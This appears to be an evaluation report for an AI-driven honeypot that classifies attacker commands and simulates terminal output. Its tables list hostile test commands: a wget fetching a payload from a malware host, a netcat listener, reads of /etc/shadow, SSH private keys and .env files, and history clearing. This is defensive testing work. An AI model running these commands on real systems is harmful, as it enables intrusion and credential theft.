# Xynera AI Backend Evaluation Report

This report summarizes the performance evaluation of the Xynera AI Backend across Classification Accuracy, Retrieval Precision, and Response Quality.

- **Timestamp**: 2026-06-30 16:28:27
- **Total Commands Tested**: 61
- **Semantic Retrieval Queries Tested**: 5
- **Total Generations Evaluated**: 14

---

## 📊 Summary of Metrics

| Metric Category | Metric Name | Value | Description |
| :--- | :--- | :--- | :--- |
| **Classification** | Overall Accuracy | `100.00%` | Correct classification of command threat classes |
| **Retrieval** | Overall Accuracy | `100.00%` | Retrieval of correct KB doc or `None` if out-of-scope |
| **Response Quality** | Avg Latency | `10.16s` | Time taken to generate simulation output |
| | No Markdown Code Blocks | `100.00%` | % of outputs without forbidden ``` wrapper |
| | No Conversational Fluff | `100.00%` | % of outputs free of apologies/preambles |
| | No Prompt Leakage | `100.00%` | % of outputs without unstripped bash prompts |
| | Parameter Adaptation | `92.86%` | % of outputs successfully substituting command args |
| **LLM-as-a-Judge** | Avg Realism | `6.64 / 10` | Realism score from Llama-3.1-8b evaluator |
| | Avg Adherence | `7.93 / 10` | simulation rules adherence (no meta-text/conversational text) |
| | Avg Consistency | `8.00 / 10` | Logical alignment with flags/inputs |

---

## 🔍 Detail: Classification Performance

### Class-Wise Metrics
| Class Name | Precision | Recall | F1-Score |
| :--- | :---: | :---: | :---: |
| Defense Evasion | 100.00% | 100.00% | 1.00 |
| Malware Download Attempt | 100.00% | 100.00% | 1.00 |
| Malware Execution Attempt | 100.00% | 100.00% | 1.00 |
| Permission Manipulation | 100.00% | 100.00% | 1.00 |
| Persistence Creation | 100.00% | 100.00% | 1.00 |
| Privilege Escalation Attempt | 100.00% | 100.00% | 1.00 |
| Reconnaissance | 100.00% | 100.00% | 1.00 |
| Reverse Shell Attempt | 100.00% | 100.00% | 1.00 |
| SQL Injection Attempt | 100.00% | 100.00% | 1.00 |
| Unknown | 100.00% | 100.00% | 1.00 |

### Classification Failures & Misclassifications
*None! The command classifier performed perfectly.*

---

## 🔍 Detail: Retrieval Performance

### Document-Wise/Class-Wise Metrics
| Target KB Command | Precision | Recall | F1-Score |
| :--- | :---: | :---: | :---: |
| None | 100.00% | 100.00% | 1.00 |
| cat /etc/gateway/router.conf | 100.00% | 100.00% | 1.00 |
| cat /etc/shadow | 100.00% | 100.00% | 1.00 |
| cat /home/dev/backup_status.txt | 100.00% | 100.00% | 1.00 |
| cat /home/ubuntu/.env | 100.00% | 100.00% | 1.00 |
| cat /home/ubuntu/.ssh/backup_key | 100.00% | 100.00% | 1.00 |
| cat /home/ubuntu/.ssh/id_rsa | 100.00% | 100.00% | 1.00 |
| cat /var/www/internal/db_backup.sql | 100.00% | 100.00% | 1.00 |
| cat /var/www/internal/dev_tasks.md | 100.00% | 100.00% | 1.00 |
| chmod | 100.00% | 100.00% | 1.00 |
| crontab | 100.00% | 100.00% | 1.00 |
| curl | 100.00% | 100.00% | 1.00 |
| df | 100.00% | 100.00% | 1.00 |
| dmesg | 100.00% | 100.00% | 1.00 |
| docker | 100.00% | 100.00% | 1.00 |
| env | 100.00% | 100.00% | 1.00 |
| find | 100.00% | 100.00% | 1.00 |
| free | 100.00% | 100.00% | 1.00 |
| grep | 100.00% | 100.00% | 1.00 |
| history | 100.00% | 100.00% | 1.00 |
| hostname | 100.00% | 100.00% | 1.00 |
| id | 100.00% | 100.00% | 1.00 |
| ifconfig | 100.00% | 100.00% | 1.00 |
| ip | 100.00% | 100.00% | 1.00 |
| iptables | 100.00% | 100.00% | 1.00 |
| last | 100.00% | 100.00% | 1.00 |
| ls | 100.00% | 100.00% | 1.00 |
| lsb_release | 100.00% | 100.00% | 1.00 |
| lscpu | 100.00% | 100.00% | 1.00 |
| nc | 100.00% | 100.00% | 1.00 |
| netcat | 100.00% | 100.00% | 1.00 |
| netstat | 100.00% | 100.00% | 1.00 |
| nmap | 100.00% | 100.00% | 1.00 |
| ping | 100.00% | 100.00% | 1.00 |
| ps | 100.00% | 100.00% | 1.00 |
| ss | 100.00% | 100.00% | 1.00 |
| systemctl | 100.00% | 100.00% | 1.00 |
| top | 100.00% | 100.00% | 1.00 |
| uname | 100.00% | 100.00% | 1.00 |
| uptime | 100.00% | 100.00% | 1.00 |
| w | 100.00% | 100.00% | 1.00 |
| wget | 100.00% | 100.00% | 1.00 |
| which | 100.00% | 100.00% | 1.00 |
| whoami | 100.00% | 100.00% | 1.00 |

### Retrieval Failures
*None! The retrieval engine found the correct documents perfectly.*

---

## 🔍 Detail: Response Quality & Simulation Realism

### Sample Generation Log & Scores
| Command | Latency | Code Blocks | No Fluff | No Prompt | Adaptation | Realism | Adherence | Consistency | Judge Feedback |
| :--- | :---: | :---: | :---: | :---: | :---: | :---: | :---: | :---: | :--- |
| `nmap -sS -v 192.168.1.1` | 0.94s | ✅ | ✅ | ✅ | ✅ | 9 | 10 | 10 | The output is very realistic, with the only minor discrepancy being the word 'target' in the reference document being replaced with '192.168.1.1' in the generated response. The AI avoided any conversational fluff, notes, apologies, explanations, or wrapping the output in markdown code blocks. The response is logically consistent with the command executed, including the flags, arguments, and IP address. |
| `wget http://malware.sh/payload.sh` | 0.94s | ✅ | ✅ | ✅ | ✅ | 9 | 10 | 10 | The output is nearly identical to the reference output, with the only minor difference being the timestamp. The AI avoided any conversational fluff, notes, apologies, explanations, or wrapping the output in markdown code blocks. The response is logically consistent with the command executed, including the IP address and filename. |
| `chmod 777 /var/www/html/uploads` | 0.76s | ✅ | ✅ | ✅ | ❌ | 8 | 9 | 10 | The output is mostly realistic, but it's missing the actual file modification time and ownership information that would be present in a real terminal. The AI did a good job of avoiding conversational fluff and explanations, but it could be improved by adding some minor details to make the output more authentic. The response is logically consistent with the command executed. |
| `nc -lvp 4444` | 9.11s | ✅ | ✅ | ✅ | ✅ | 8 | 9 | 10 | The output is mostly realistic, but it's missing the actual listening address and port information that would be displayed by the netcat command. The output is clean and doesn't contain any conversational fluff or explanations, which is good. The response is logically consistent with the command executed, as it's listening on the specified port. |
| `history -c` | 12.72s | ✅ | ✅ | ✅ | ✅ | 8 | 9 | 10 | The output is very realistic, but it lacks the exact formatting of the reference document. The 'No command history' message is a direct response, which is good for adherence. The command executed is correctly cleared, so the consistency is perfect. |
| `crontab -e` | 14.68s | ✅ | ✅ | ✅ | ✅ | 0 | 0 | 0 | The generated AI response is completely unrealistic and does not resemble the output of a real Linux terminal for the 'crontab -e' command. The output is a repetitive and nonsensical sequence of visudo error messages, which is not related to the command executed. The AI also failed to adhere to the format of a terminal output, including conversational fluff and code block tags. The response is also inconsistent with the command executed, as crontab -e is used to edit the cron table, not visudo. |
| `find / -perm -4000 -type f 2>/dev/null` | 13.65s | ✅ | ✅ | ✅ | ✅ | 6 | 8 | 4 | The output is mostly realistic, but the presence of /var/www/internal/ files suggests that the AI may not fully understand the context of the command. The -perm -4000 flag is used to find files with the setuid bit set, which is typically found in /home/ubuntu or /root directories. The AI's output is inconsistent with this expectation. |
| `ps aux` | 22.24s | ✅ | ✅ | ✅ | ✅ | 9 | 10 | 10 | The output is very realistic, with the correct format and content. However, it's missing the header line 'USER       PID %CPU %MEM COMMAND' which is present in the reference output. The AI perfectly avoided any conversational fluff and provided a clean terminal output. |
| `netstat -antp` | 15.91s | ✅ | ✅ | ✅ | ✅ | 8 | 9 | 9 | The output is mostly realistic, but the inclusion of 'Recv-Q' and 'Send-Q' columns is not typical for a 'netstat -antp' command. A real 'netstat -antp' command would typically only show the 'Proto', 'Local Address', 'Foreign Address', 'State', and 'PID/Program name' columns. The AI did a good job of avoiding conversational fluff and explanations, but the output is not perfect. The response is logically consistent with the command executed, including the flags and arguments. |
| `ping -c 4 8.8.8.8` | 20.98s | ✅ | ✅ | ✅ | ✅ | 8 | 9 | 10 | The output is very realistic, but it lacks the initial PING line with the hostname and IP address. The adherence is high because the output is mostly clean, but it could be improved by removing the trailing whitespace. The consistency is perfect because the output matches the command executed, including the flags, arguments, and IP address. |
| `cat /home/ubuntu/.ssh/id_rsa` | 0.00s | ✅ | ✅ | ✅ | ✅ | 9 | 10 | 10 | The output is almost identical to the reference, with the same formatting and content. The AI avoided any conversational fluff, notes, apologies, explanations, or wrapping the output in markdown code blocks. The response is logically consistent with the command executed, as it correctly outputs the contents of the /home/ubuntu/.ssh/id_rsa file. |
| `cat /home/ubuntu/.env` | 0.00s | ✅ | ✅ | ✅ | ✅ | 9 | 10 | 10 | The output is nearly identical to the reference, but the realism score is not a 10 because the output is missing the typical Unix-style file permissions and timestamps that would be present in a real terminal output. The AI avoided any conversational fluff, notes, apologies, explanations, or wrapping the output in markdown code blocks, and the response is logically consistent with the command executed. |
| `mkdir /tmp/test` | 11.18s | ✅ | ✅ | ✅ | ✅ | 2 | 8 | 9 | The output is not entirely realistic as it implies the directory was created successfully, whereas the expected output should indicate the command was not found. The AI response is mostly clean, but the word 'created' is not typically part of the mkdir command's output. The response is consistent with the command executed, but the expected output would be different. |
| `pwd` | 19.10s | ✅ | ✅ | ✅ | ✅ | 0 | 0 | 0 | The output '/home/ubuntu' is not realistic for the 'pwd' command, which should display the current working directory. A real Linux terminal would output something like '/home/user' or the path to the current directory. The AI response also lacks any indication that the command was not found, which is expected for a 'pwd' command in a honeypot scenario. |
